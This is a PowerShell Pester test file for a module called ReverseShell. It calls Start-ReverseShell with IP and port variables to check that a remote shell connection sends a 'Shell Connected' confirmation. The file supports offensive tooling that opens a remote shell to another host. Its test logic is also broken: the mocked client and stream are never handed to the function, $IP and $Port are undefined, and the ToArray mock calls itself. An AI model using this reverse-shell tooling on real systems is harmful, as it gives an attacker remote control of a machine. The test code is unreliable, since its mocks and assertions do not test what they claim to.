Import-Module Pester
Import-Module ./ReverseShell.psm1

# Invoke-Pester -Script ./ReverseShell.Tests.ps1 -PassThru -Output Detailed
Describe "Start-ReverseShell" {
    Context "When connecting to a remote host" {
        It "Should establish a connection and send a connection confirmation" {
            # Arrange
            $expectedConfirmation = "Shell Connected: " + (Get-Date).ToString() + "`n"
            $mockClient = [System.Net.Sockets.TCPClient]::new()
            $mockStream = [System.IO.MemoryStream]::new()

            $mockClient | Add-Member -NotePropertyName "GetStream" -Force -NotePropertyValue { $mockStream }
            $mockStream | Add-Member -NotePropertyName "Write" -NotePropertyValue -Force { param($bytes, $offset, $count) { } }
            $mockStream | Add-Member -NotePropertyName "Read" -NotePropertyValue -Force { param($bytes, $offset, $count) { 0 } }
            $mockStream | Add-Member -NotePropertyName "ToArray" -NotePropertyValue -Force { $this.ToArray() }
            $mockStream | Add-Member -NotePropertyName "Flush" -NotePropertyValue -Force { }
            $mockStream | Add-Member -NotePropertyName "Close" -NotePropertyValue  -Force { }
            $mockStream | Add-Member -NotePropertyName "Length" -NotePropertyValue -Force { 0 }

            # Act
            $result = Start-ReverseShell -IP $IP -Port $Port
            Write-Host $result

            # Assert
            $mockStream.ToArray() | ForEach-Object {
                $receivedData = [System.Text.Encoding]::ASCII.GetString($_)
                $receivedData | Should -Be $expectedConfirmation
            }
            
            $result | Should -BeNullOrEmpty

        }
    }
}


